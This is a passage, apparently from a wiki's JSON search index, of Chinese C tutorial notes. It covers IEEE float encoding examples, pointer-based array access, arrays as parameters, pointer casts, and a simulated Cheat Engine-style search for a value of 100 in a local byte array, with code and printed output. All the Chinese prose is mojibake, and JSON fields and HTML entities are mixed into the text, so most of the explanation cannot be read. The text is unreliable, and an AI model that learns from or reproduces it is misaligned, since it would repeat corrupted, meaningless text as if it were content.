è§‚å¯Ÿè®¡ç®—è¿‡ç¨‹ï¼Œåªæœ‰ç¬¦å·ä½å˜äº†ï¼Œå…¶ä»–ä¸€æ ·ï¼Œæ‰€ä»¥æ˜¯ ç¬¦å·ä½ æŒ‡æ•°éƒ¨åˆ† å°¾æ•°éƒ¨åˆ† 1 10000010 00001000000000000000000 1100 0001 0000 0100 0000 0000 0000 0000 åå…­è¿›åˆ¶å°±æ˜¯ï¼š0xC1040000h ä¾‹2 0.25è½¬æˆæµ®ç‚¹å­˜å‚¨ æ­¥éª¤ä¸€ å°†å®æ•°éƒ¨åˆ†è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ ¼å¼ æ­¥éª¤äºŒ äºŒè¿›åˆ¶çš„ç§‘å­¦è®¡æ•°æ³• 0.01-&gt;1.0Ã—2çš„-2æ¬¡æ–¹ï¼Œn=-2 æ­¥éª¤ä¸‰ å¡«å……å°¾éƒ¨éƒ¨åˆ† ç¬¦å·ä½ æŒ‡æ•°éƒ¨åˆ† å°¾æ•°éƒ¨åˆ† 00000000000000000000000 æ­¥éª¤å›› å¡«å……ç¬¦å·ä½ 0.25æ˜¯æ­£æ•°ï¼Œç¬¦å·ä½ä¸º0 ç¬¦å·ä½ æŒ‡æ•°éƒ¨åˆ† å°¾æ•°éƒ¨åˆ† 0 00000000000000000000000 æ­¥éª¤äº” å¤„ç†æŒ‡æ•°éƒ¨åˆ† næ˜¯å³ç§»å¾—åˆ°çš„ï¼Œç¬¬30ä½æ”¾å…¥â€œ0â€ï¼Œå…¶ä½™è¡¥0ï¼ŒæŒ‡æ•°éƒ¨åˆ†æ­¤æ—¶å˜æˆ00000000ã€‚ ç¬¦å·ä½ æŒ‡æ•°éƒ¨åˆ† å°¾æ•°éƒ¨åˆ† 0 00000000 00000000000000000000000 å°†nå‡å»1ï¼Œè½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œæ”¾å…¥ç¬¬29åˆ°ç¬¬23ä½ï¼ˆ7ä¸ªé›¶ï¼Œ0000000ï¼‰ -2-1=-3ï¼ŒäºŒè¿›åˆ¶æ•°æ˜¯FDï¼Œ1111 1101æ”¾å…¥æŒ‡æ•°éƒ¨åˆ†ï¼Œå¾—åˆ°01111101 1111 1101 æ³¨æ„æ”¾å…¥çš„æ˜¯ç¬¬29åˆ°ç¬¬23ä½ï¼Œç¬¬30ä½ä¸åŠ¨ï¼Œæ‰€ä»¥00000000-&gt;01111101 è€Œä¸æ˜¯00000000-&gt;11111101 ç¬¦å·ä½ æŒ‡æ•°éƒ¨åˆ† å°¾æ•°éƒ¨åˆ† 0 01111101 00000000000000000000000 00111110100000000000000000000000 åå…­è¿›åˆ¶å°±æ˜¯ï¼š3E800000h doubleç±»å‹çš„IEEEç¼–ç  å’Œfloatä¸€æ ·ï¼Œåªæ˜¯èŒƒå›´æ›´å¤§ã€‚1+11+52ã€‚ç”¨ä¼ ç»Ÿè®¡ç®—æ–¹æ³•æ‰€ä»¥åç½®å€¼æ˜¯1023ã€‚ä½†æµ·å“¥çš„è®¡ç®—æ–¹æ³•ä¸ä¼šå˜ã€‚ æµ®ç‚¹ç±»å‹çš„ç²¾åº¦ å¾…è€ƒç©¶ floatå’Œdoubleçš„ç²¾åº¦æ˜¯ç”±å°¾æ•°çš„ä½æ•°æ¥å†³å®šçš„ï¼› æ¯”å¦‚ï¼Œ8.25 1000.01-&gt;1.00001Ã—2çš„3æ¬¡æ–¹ï¼Œå­˜å…¥23ä½çš„å°¾æ•°æ—¶æ—¢å­˜å…¥äº†æ•´æ•°éƒ¨åˆ†ï¼Œä¹Ÿå­˜å…¥äº†å°æ•°éƒ¨åˆ†ã€‚æ‰€ä»¥çœ‹åˆ°è¿™ç±»è¯´æ³•éƒ½æ˜¯é”™çš„ï¼šfloatç±»å‹èƒ½ç²¾ç¡®åˆ°å°æ•°ç‚¹åå‡ ä½ã€‚ float : 2^23 = 8388608 ä¸€å…±7ä½ï¼Œè¿™æ„å‘³ç€æœ€å¤šèƒ½æœ‰7ä½æœ‰æ•ˆæ•°å­—ï¼ˆæ•´æ•°+å°æ•°ä¸€å…±7ä½ï¼›è€Œä¸æ˜¯å°æ•°ç‚¹å7ä½ï¼‰ï¼› double : 2^52 = 4503599627370496 ä¸€å…±16ä½ï¼Œè¿™æ„å‘³ç€æœ€å¤šèƒ½æœ‰16ä½æœ‰æ•ˆæ•°å­—ã€‚ ç»ƒä¹  å°†floatç±»å‹çš„12.5è½¬æ¢æˆ16è¿›åˆ¶ ç­”æ¡ˆæ­¥éª¤ä¸€ å°†å®æ•°éƒ¨åˆ†è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ ¼å¼12345 å•† ä½™12/2=6 06/2 =3 03/2 =1 11/2=0 110.5*2=1.0 11100.1æ­¥éª¤äºŒ äºŒè¿›åˆ¶çš„ç§‘å­¦è®¡æ•°æ³•1100.1-&gt;1.1001Ã—2çš„3æ¬¡æ–¹ï¼Œn=3æ­¥éª¤ä¸‰ å¡«å……å°¾éƒ¨éƒ¨åˆ†ç¬¦å·ä½æŒ‡æ•°éƒ¨åˆ†å°¾æ•°éƒ¨åˆ†10010000000000000000000æ­¥éª¤å›› å¡«å……ç¬¦å·ä½12.5æ˜¯æ­£æ•°ï¼Œç¬¦å·ä½ä¸º0ç¬¦å·ä½æŒ‡æ•°éƒ¨åˆ†å°¾æ•°éƒ¨åˆ†010010000000000000000000æ­¥éª¤äº” å¤„ç†æŒ‡æ•°éƒ¨åˆ†næ˜¯å·¦ç§»å¾—åˆ°çš„ï¼Œç¬¬30ä½æ”¾å…¥â€œ1â€ï¼Œå…¶ä½™è¡¥0ï¼ŒæŒ‡æ•°éƒ¨åˆ†æ­¤æ—¶å˜æˆ10000000ã€‚ç¬¦å·ä½æŒ‡æ•°éƒ¨åˆ†å°¾æ•°éƒ¨åˆ†01000000010010000000000000000000å°†nå‡å»1ï¼Œè½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œæ”¾å…¥ç¬¬29åˆ°ç¬¬23ä½ï¼ˆ7ä¸ªé›¶ï¼Œ0000000ï¼‰3-1=2ï¼ŒäºŒè¿›åˆ¶æ•°æ˜¯10ã€‚æ”¾å…¥æŒ‡æ•°éƒ¨åˆ†ç¬¬29åˆ°ç¬¬23ä½ï¼Œå¾—åˆ°ç¬¦å·ä½æŒ‡æ•°éƒ¨åˆ†å°¾æ•°éƒ¨åˆ†0100000101001000000000000000000001000001010010000000000000000000åå…­è¿›åˆ¶å°±æ˜¯ï¼š41480000h"},{"title":"ç”¨æŒ‡é’ˆæ“ä½œæ•°ç»„","path":"/wiki/C/ç”¨æŒ‡é’ˆæ“ä½œæ•°ç»„.html","content":"ç”¨æŒ‡é’ˆæ“ä½œæ•°ç»„ å‡è®¾æœ‰è¿™ä¹ˆä¸€ä¸ªæ•°ç»„ï¼š 1char arr[5] = &#123;1, 2, 3, 4, 5&#125;; arr[0]è¡¨ç¤ºæ•°ç»„ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå®ƒæ˜¯ä¸ªå˜é‡ï¼› arr[1]è¡¨ç¤ºæ•°ç»„ä¸­ç¬¬äºŒä¸ªå…ƒç´ ï¼Œå®ƒæ˜¯ä¸ªå˜é‡ï¼› arr[2]è¡¨ç¤ºæ•°ç»„ä¸­ç¬¬ä¸‰ä¸ªå…ƒç´ ï¼Œå®ƒæ˜¯ä¸ªå˜é‡ï¼› arr[3]è¡¨ç¤ºæ•°ç»„ä¸­ç¬¬å››ä¸ªå…ƒç´ ï¼Œå®ƒæ˜¯ä¸ªå˜é‡ï¼› arr[4]è¡¨ç¤ºæ•°ç»„ä¸­ç¬¬äº”ä¸ªå…ƒç´ ï¼Œå®ƒæ˜¯ä¸ªå˜é‡ã€‚ å‰é¢ï¼Œå­¦è¿‡ï¼Œ&amp;å¯ä»¥ç”¨æ¥å–å˜é‡çš„åœ°å€ï¼Œé‚£ä¹ˆç»™å˜é‡arr[0]åŠ ä¸Š&amp;æ˜¯å¯è¡Œçš„ï¼Œäºæ˜¯ï¼š &amp;arr[0]è¡¨ç¤ºæ•°ç»„ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ çš„åœ°å€ï¼› &amp;arr[1]è¡¨ç¤ºæ•°ç»„ä¸­ç¬¬äºŒä¸ªå…ƒç´ çš„åœ°å€ï¼› &amp;arr[2]è¡¨ç¤ºæ•°ç»„ä¸­ç¬¬ä¸‰ä¸ªå…ƒç´ çš„åœ°å€ï¼› &amp;arr[3]è¡¨ç¤ºæ•°ç»„ä¸­ç¬¬å››ä¸ªå…ƒç´ çš„åœ°å€ï¼› &amp;arr[4]è¡¨ç¤ºæ•°ç»„ä¸­ç¬¬äº”ä¸ªå…ƒç´ çš„åœ°å€ã€‚ &amp;arr[i]åæ˜¯åœ°å€ï¼Œå®ƒæ˜¯ä¸ªå¸¸é‡ï¼Œç±»å‹æ˜¯char*ï¼Œè¦ç”¨ä¸€ä¸ªchar*ç±»å‹çš„å®¹å™¨ï¼ˆå˜é‡ï¼‰æ¥å­˜è¿™ä¸ªæ•°ã€‚ æ­¤å¤–ï¼Œarrä¹Ÿè¡¨ç¤ºæ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ çš„åœ°å€ã€‚ 1234char *p;p = &amp;arr[0]; //å†™æ³•ä¸€p = arr; //å†™æ³•äºŒ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨æŒ‡é’ˆæ¥æ“ä½œæ•°ç»„ï¼Œå¦‚ä¸‹ä»£ç ï¼š 12345// æ•°ç»„å†™æ³•for (int i = 0; i &lt; 5; i++)&#123; printf(&quot;%d &quot;, arr[i]);&#125; 12345678char *p;p = arr;// æŒ‡é’ˆå†™æ³•for (int i = 0; i &lt; 5; i++)&#123; printf(&quot;%d &quot;, *(p + i)); //p+iåŠ æ‹¬å·ï¼Œä¸ºäº†å¯è¯»æ€§&#125; å°ç»“ &amp;arr[0]è¡¨ç¤ºå–æ•°ç»„ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ çš„åœ°å€ï¼Œå¯ä»¥çœç•¥ä¸ºæ•°ç»„åarr *(p+i) = p[i] æ•°ç»„ä½œä¸ºå‡½æ•°å‚æ•° ä¹‹å‰æˆ‘ä»¬å­¦ä¹ è¿‡å‡½æ•°å‚æ•°çš„ä¼ é€’ï¼Œå¦‚ä¸‹è¿™ä¸ªä¾‹å­ï¼Œè°ƒç”¨pluså‡½æ•°åæ‰“å°è¾“å‡ºxçš„å€¼ä»æ˜¯1ï¼Œæ²¡æœ‰å‘ç”Ÿå˜åŒ–ã€‚å› ä¸ºå‡½æ•°å‚æ•°ä¼ é€’åªæ˜¯ä¼ äº†ä¸€ä»½å‰¯æœ¬ï¼Œæ˜¯å€¼ä¼ é€’ï¼Œåœ¨pluså‡½æ•°ä¸­å¯¹xçš„ä¿®æ”¹å¹¶ä¸å½±å“mainå‡½æ•°ä¸­xçš„å€¼ã€‚ 1234567891011121314#include &quot;stdafx.h&quot;void plus(int p)&#123; p = p + 1;&#125;int main()&#123; int x = 1; plus(x); printf(&quot;%d &quot;, x); return 0;&#125; å¦‚æœå‡½æ•°å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå®ƒä¹Ÿæ˜¯å€¼ä¼ é€’å—ï¼Ÿ å®šä¹‰æ•°ç»„å‚æ•°æ—¶æ–¹æ‹¬å·ä¸­ä¸è¦å†™å¸¸é‡; æ•°ç»„ä½œä¸ºå‚æ•°è¿›è¡Œä¼ é€’æ—¶ï¼Œè¦ä¼ é€’æ•°ç»„çš„é•¿åº¦ 12345678910111213141516#include &quot;stdafx.h&quot;void printArray(int arr[], int nLength)&#123; for (int i = 0; i &lt; nLength; i++) &#123; printf(&quot;%d &quot;, arr[i]); &#125;&#125;int main()&#123; int arr[5] = &#123;1, 2, 3, 4, 5&#125;; printArray(arr, 5); return 0;&#125; åœ¨æ±‡ç¼–ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯å°†æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ çš„åœ°å€ä½œä¸ºå‚æ•°ä¼ è¿›äº†printArrayå‡½æ•° å°ç»“ï¼šæ•°ç»„ä½œä¸ºå‚æ•°æ—¶ï¼Œä¼ é€’çš„æ˜¯åœ°å€ã€‚ é‚£æˆ‘ä»¬å†™printArrayçš„å‚æ•°æ—¶ç›´æ¥å†™ä¸ªæŒ‡é’ˆï¼Œè°ƒç”¨å‡½æ•°æ—¶å°†æ•°ç»„é¦–åœ°å€ä¼ ç»™è¿™ä¸ªæŒ‡é’ˆä¸ä¹Ÿå¯ä»¥ï¼Ÿ 12345678910111213141516#include &quot;stdafx.h&quot;void printArray(int* p, int nLength)&#123; for (int i = 0; i &lt; nLength; i++) &#123; printf(&quot;%d &quot;, *(p+i)); &#125;&#125;int main()&#123; int arr[5] = &#123;1, 2, 3, 4, 5&#125;; printArray(arr, 5); return 0;&#125; æ±‡ç¼–ä»£ç å’Œä¸Šä¸€å¼ æˆªå›¾æ˜¯ä¸€æ ·çš„ å°ç»“ï¼Œå¦‚ä¸‹å†™æ³•éƒ½æ˜¯å¯è¡Œçš„ï¼š 12345678void printArray(int arr[], int nLength) //å‚æ•°å£°æ˜æ˜¯arr[]&#123; for (int i = 0; i &lt; nLength; i++) &#123; printf(&quot;%d &quot;, arr[i]); //å†™æ³•ä¸€ printf(&quot;%d &quot;, *(arr+i)); //å†™æ³•äºŒ &#125;&#125; 12345678void printArray(int* p, int nLength) //å‚æ•°å£°æ˜æ˜¯*p&#123; for (int i = 0; i &lt; nLength; i++) &#123; printf(&quot;%d &quot;, *(p+i)); //å†™æ³•ä¸€ printf(&quot;%d &quot;, p[i]); //å†™æ³•äºŒ &#125;&#125; ç±»å‹è½¬æ¢ char,short,intè¿™äº›åŸºæœ¬ç±»å‹ä¹‹é—´èƒ½å¼ºè½¬ 1234int x = 10; char y = x; // ç®€å†™char y = (char)x; // å®Œæ•´å†™æ³• ä¸èƒ½å°†intç±»å‹è½¬æˆè‡ªå®šä¹‰ç»“æ„ä½“ 12345678910111213struct Student&#123; int id; int level;&#125;;void Test()&#123; int x = 10; Student s = x; //ç®€å†™å†™æ³•ï¼Œä¸è¡Œï¼Œç¼–è¯‘ä¸é€šè¿‡ã€‚ç¼–è¯‘å™¨æŠ¥é”™ï¼šæ— æ³•å°†intç±»å‹è½¬æˆstruct Studentç±»å‹ Student s = (Student)x; //å®Œæ•´å†™æ³•ï¼Œä¸è¡Œï¼Œç¼–è¯‘ä¸é€šè¿‡ã€‚ç¼–è¯‘å™¨æŠ¥é”™ï¼šæ— æ³•å°†intç±»å‹è½¬æˆstruct Studentç±»å‹&#125; æŒ‡é’ˆä¹‹é—´ï¼Œå¯ä»¥å¼ºè½¬ ä¾‹1 åŠ (int*)å¼ºè½¬ï¼Œç¼–è¯‘é€šè¿‡ ä¾‹2 åŸºæœ¬ç±»å‹å¼ºè½¬ä¸ºç»“æ„ä½“æŒ‡é’ˆç±»å‹ï¼Œok ä¾‹3 ä¸åŒçº§åˆ«çš„æŒ‡é’ˆä¹‹é—´å¼ºè½¬ ç”¨é€”ï¼šç»™ä¸€å—å†…å­˜ï¼Œè®©è‡ªå·±éšå¿ƒæ‰€æ¬²åœ°è®¿é—®è¿™å—å†…å­˜ï¼Œè‡ªå·±æƒ³å‡ å­—èŠ‚è®¿é—®å°±å‡ å­—èŠ‚è®¿é—® æ¨¡æ‹Ÿå®ç°CEçš„æ•°æ®æœç´¢åŠŸèƒ½ CEæ˜¯ä¸€æ¬¾èƒ½å¯¹è¿›ç¨‹ç©ºé—´æœç´¢æ•°æ®çš„è½¯ä»¶ï¼Œå› ä¸ºæˆ‘ä»¬è¿˜æ²¡å­¦åˆ°win32ç›¸å…³çš„çŸ¥è¯†ï¼Œå¦‚ä½•æ‰“å¼€è¿›ç¨‹ï¼Œæœç´¢è¿›ç¨‹ã€‚è¿™é‡Œå°±ä»¥ä¸€ä¸ªcharå‹æ•°ç»„æ¥è¡¨ç¤ºè¿›ç¨‹ç©ºé—´ä¸­çš„æŸæ®µæ•°æ®ã€‚ è¿™ä¸€å †æ•°æ®ä¸­å­˜å‚¨äº†è§’è‰²çš„è¡€å€¼ä¿¡æ¯ï¼Œå‡è®¾è¡€å€¼çš„ç±»å‹ä¸ºintç±»å‹ï¼Œå€¼ä¸º100(10è¿›åˆ¶)ï¼Œè¯·åˆ—å‡ºæ‰€æœ‰å¯èƒ½çš„å€¼ä»¥åŠè¯¥å€¼å¯¹åº”çš„åœ°å€ã€‚ 123456789100x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11,0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,0x00,0x02,0x74,0x0F,0x41,0x00,0x06,0x08,0x00,0x00,0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00 çƒ­èº«ï¼š é€šè¿‡charæŒ‡é’ˆéå†æ•°æ®ï¼Œæ‰¾å‡ºå€¼ä¸º100çš„ é€šè¿‡shortæŒ‡é’ˆéå†æ•°æ®ï¼Œæ‰¾å‡ºå€¼ä¸º100çš„ é€šè¿‡intæŒ‡é’ˆéå†æ•°æ®ï¼Œæ‰¾å‡ºå€¼ä¸º100çš„ å°ç«¯åºï¼Œå‡è®¾æ˜¯intç±»å‹ï¼Œè®¡ç®—æœºè¯»0x00,0x01,0x02,0x03æ—¶ï¼Œå®é™…ä¸Šæ˜¯0x03ï¼Œ0x02ï¼Œ0x01ï¼Œ0x00ã€‚ å½“ç„¶ï¼Œå†™ä»£ç æ—¶ç›´æ¥å†™*p=100ã€‚åªæ˜¯äººä¸ºçœ‹è¿™å †æ•°æ®æ—¶è¦åè¿‡æ¥ ç­”æ¡ˆcharæŒ‡é’ˆshortæŒ‡é’ˆintæŒ‡é’ˆ12345678910111213141516171819202122232425262728#include &quot;stdafx.h&quot;char data[100] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x74, 0x0F, 0x41, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00&#125;;int main()&#123; char* p = (char*)data; //dataæ˜¯charç±»å‹ï¼Œå’ŒæŒ‡é’ˆç±»å‹ä¸€è‡´ for (int i = 0; i &lt; 100 ; i++) //100ä¸ªæ•°æ®ï¼Œcharé•¿åº¦æ˜¯1ï¼Œä¸€å…±100æ¬¡ï¼Œ0-100 &#123; if (*(p + i) == 100) &#123; printf(&quot;%d: %p %d &quot;, i, p + i, *(p + i)); &#125; &#125; return 0;&#125;æ£€æŸ¥ï¼ŒæŒ‰charä¾æ¬¡æ‰“å°æ¯ä¸ªå€¼ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991000: 00424A30 0 1: 00424A31 1 2: 00424A32 2 3: 00424A33 3 4: 00424A34 4 5: 00424A35 5 6: 00424A36 6 7: 00424A37 7 8: 00424A38 7 9: 00424A39 9 10: 00424A3A 0 11: 00424A3B 32 12: 00424A3C 16 13: 00424A3D 3 14: 00424A3E 3 15: 00424A3F 12 16: 00424A40 0 17: 00424A41 0 18: 00424A42 68 19: 00424A43 0 20: 00424A44 0 21: 00424A45 51 22: 00424A46 0 23: 00424A47 71 24: 00424A48 12 25: 00424A49 14 26: 00424A4A 0 27: 00424A4B 13 28: 00424A4C 0 29: 00424A4D 17 30: 00424A4E 0 31: 00424A4F 0 32: 00424A50 0 33: 00424A51 2 34: 00424A52 100 35: 00424A53 0 36: 00424A54 0 37: 00424A55 0 38: 00424A56 -86 39: 00424A57 0 40: 00424A58 0 41: 00424A59 0 42: 00424A5A 100 43: 00424A5B 16 44: 00424A5C 0 45: 00424A5D 0 46: 00424A5E 0 47: 00424A5F 0 48: 00424A60 0 49: 00424A61 0 50: 00424A62 0 51: 00424A63 0 52: 00424A64 2 53: 00424A65 0 54: 00424A66 116 55: 00424A67 15 56: 00424A68 65 57: 00424A69 0 58: 00424A6A 0 59: 00424A6B 0 60: 00424A6C 1 61: 00424A6D 0 62: 00424A6E 0 63: 00424A6F 0 64: 00424A70 5 65: 00424A71 0 66: 00424A72 0 67: 00424A73 0 68: 00424A74 10 69: 00424A75 0 70: 00424A76 0 71: 00424A77 2 72: 00424A78 116 73: 00424A79 15 74: 00424A7A 65 75: 00424A7B 0 76: 00424A7C 6 77: 00424A7D 8 78: 00424A7E 0 79: 00424A7F 0 80: 00424A80 0 81: 00424A81 0 82: 00424A82 0 83: 00424A83 100 84: 00424A84 0 85: 00424A85 15 86: 00424A86 0 87: 00424A87 0 88: 00424A88 13 89: 00424A89 0 90: 00424A8A 0 91: 00424A8B 0 92: 00424A8C 35 93: 00424A8D 0 94: 00424A8E 0 95: 00424A8F 100 96: 00424A90 0 97: 00424A91 0 98: 00424A92 100 99: 00424A93 0 12345678910111213141516171819202122232425262728#include &quot;stdafx.h&quot;char data[100] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x74, 0x0F, 0x41, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00&#125;;int main()&#123; short* p = (short*)data; //dataæ˜¯charç±»å‹ï¼Œè¦è½¬æˆå’ŒæŒ‡é’ˆä¸€æ ·çš„ç±»å‹ for (int i = 0; i &lt; 100 / 2; i++) //100ä¸ªæ•°æ®ï¼Œshorté•¿åº¦æ˜¯2ï¼Œä¸€å…±50æ¬¡ï¼Œ0-50 &#123; if (*(p + i) == 100) &#123; printf(&quot;%d: %p %d &quot;, i, p + i, *(p + i)); &#125; &#125; return 0;&#125;æ£€æŸ¥ï¼ŒæŒ‰shortä¾æ¬¡æ‰“å°æ¯ä¸ªå€¼ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849500: 00424A30 256 1: 00424A32 770 2: 00424A34 1284 3: 00424A36 1798 4: 00424A38 2311 5: 00424A3A 8192 6: 00424A3C 784 7: 00424A3E 3075 8: 00424A40 0 9: 00424A42 68 10: 00424A44 13056 11: 00424A46 18176 12: 00424A48 3596 13: 00424A4A 3328 14: 00424A4C 4352 15: 00424A4E 0 16: 00424A50 512 17: 00424A52 100 18: 00424A54 0 19: 00424A56 170 20: 00424A58 0 21: 00424A5A 4196 22: 00424A5C 0 23: 00424A5E 0 24: 00424A60 0 25: 00424A62 0 26: 00424A64 2 27: 00424A66 3956 28: 00424A68 65 29: 00424A6A 0 30: 00424A6C 1 31: 00424A6E 0 32: 00424A70 5 33: 00424A72 0 34: 00424A74 10 35: 00424A76 512 36: 00424A78 3956 37: 00424A7A 65 38: 00424A7C 2054 39: 00424A7E 0 40: 00424A80 0 41: 00424A82 25600 42: 00424A84 3840 43: 00424A86 0 44: 00424A88 13 45: 00424A8A 0 46: 00424A8C 35 47: 00424A8E 25600 48: 00424A90 0 49: 00424A92 100 12345678910111213141516171819202122232425262728#include &quot;stdafx.h&quot;char data[100] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x74, 0x0F, 0x41, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00&#125;;int main()&#123; int* p = (int*)data; //dataæ˜¯charç±»å‹ï¼Œè¦è½¬æˆå’ŒæŒ‡é’ˆä¸€æ ·çš„ç±»å‹ for (int i = 0; i &lt; 100 / 4; i++) //100ä¸ªæ•°æ®ï¼Œinté•¿åº¦æ˜¯4ï¼Œä¸€å…±25æ¬¡ï¼Œ0-25 &#123; if (*(p + i) == 100) &#123; printf(&quot;%d: %p %d &quot;, i, p + i, *(p + i)); &#125; &#125; return 0;&#125;æ£€æŸ¥ï¼ŒæŒ‰intä¾æ¬¡æ‰“å°æ¯ä¸ªå€¼ï¼š123456789101112131415161718192021222324250: 00424A30 50462976 1: 00424A34 117835012 2: 00424A38 536873223 3: 00424A3C 201523984 4: 00424A40 4456448 5: 00424A44 1191195392 6: 00424A48 218107404 7: 00424A4C 4352 8: 00424A50 6554112 9: 00424A54 11141120 10: 00424A58 274989056 11: 00424A5C 0 12: 00424A60 0 13: 00424A64 259260418 14: 00424A68 65 15: 00424A6C 1 16: 00424A70 5 17: 00424A74 33554442 18: 00424A78 4263796 19: 00424A7C 2054 20: 00424A80 1677721600 21: 00424A84 3840 22: 00424A88 13 23: 00424A8C 1677721635 24: 00424A90 6553600 ä¸Šè¿°åšæ³•çš„é—®é¢˜ è¿™åªæ˜¯ä¸€å †æ•°æ®ï¼Œåœ¨æœç´¢è¿›ç¨‹ç©ºé—´æ—¶ä½ ä¸çŸ¥é“è¿™å †æ•°æ®æ˜¯æ€ä¹ˆç»„åˆçš„ï¼Œå®ƒä¸ä¸€å®šå°±æ˜¯intç±»å‹ï¼Œä¹Ÿä¸ä¸€å®šæ°å¥½intæŒ¨ç€intã€‚æœ‰å¯èƒ½è¿™æ˜¯charï¼Œä¸‹ä¸€ä¸ªæ˜¯intï¼Œä¸‹ä¸€ä¸ªæ˜¯shortï¼Œéƒ½æœ‰å¯èƒ½ã€‚ æ‰€ä»¥æ­£ç¡®çš„æœç´¢æ–¹å¼åº”è¯¥æ˜¯å¦‚ä¸‹ï¼š å‡è®¾ä¸€ä¸ªintç±»å‹çš„æŒ‡é’ˆè¿›è¡Œæœç´¢ï¼Œ ç¬¬ä¸€æ¬¡ï¼Œä»ç¬¬ä¸€ä¸ªå­—èŠ‚å¼€å§‹æŸ¥ï¼Œè¯»äº†0x00,0x01,0x02,0x03ï¼ŒæŒ‡é’ˆç§»åŠ¨1ä¸ªå­—èŠ‚ï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªå­—èŠ‚0x01 ç¬¬ä¸€æ¬¡ï¼Œä»ç¬¬äºŒä¸ªå­—èŠ‚å¼€å§‹æŸ¥ï¼ˆè€Œä¸æ˜¯ç§»åŠ¨4ä¸ªå­—èŠ‚ï¼Œä»0x04å¼€å§‹æŸ¥ï¼‰ï¼Œè¯»äº†0x01,0x02,0x03,0x04ï¼ŒæŒ‡é’ˆå†ç§»åŠ¨1ä¸ªå­—èŠ‚ï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªå­—èŠ‚0x03 ä»¥æ­¤ç±»æ¨ é—®é¢˜ï¼š intç±»å‹æŒ‡é’ˆè¯»å–æ•°æ®ï¼Œä¸€æ¬¡è¯»4ä¸ªå­—èŠ‚ï¼›æ¯+1ï¼ŒåŠ 